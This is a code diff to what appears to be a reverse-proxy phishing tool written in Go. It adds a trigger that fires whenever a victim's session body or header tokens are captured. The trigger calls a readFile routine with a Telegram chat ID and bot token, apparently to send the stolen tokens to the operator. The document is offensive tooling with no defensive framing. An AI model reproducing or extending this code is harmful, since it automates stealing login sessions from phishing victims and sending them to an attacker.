@@ -762,7 +762,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if trigger == 1 {
 								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
-							
 
 						} else if form_re.MatchString(contentType) {
 							trigger = 0
@@ -866,7 +865,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if trigger == 1 {
 								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 							}
-							
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -922,6 +920,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
+
+			trigger := 0
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
@@ -1038,6 +1038,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
+									trigger = 1
 								}
 							}
 						}
@@ -1049,6 +1050,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							hv := resp.Request.Header.Get(v.header)
 							if hv != "" {
 								s.HttpTokens[k] = hv
+								trigger = 1
 							}
 						}
 					}
@@ -1060,9 +1062,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
 						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
 							is_body_auth = true
+
 						}
 						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
 							is_http_auth = true
+
 						}
 					}
 				}
@@ -1259,6 +1263,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+			}
+
+			if trigger == 1 {
+				readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 			}
 
 			return resp
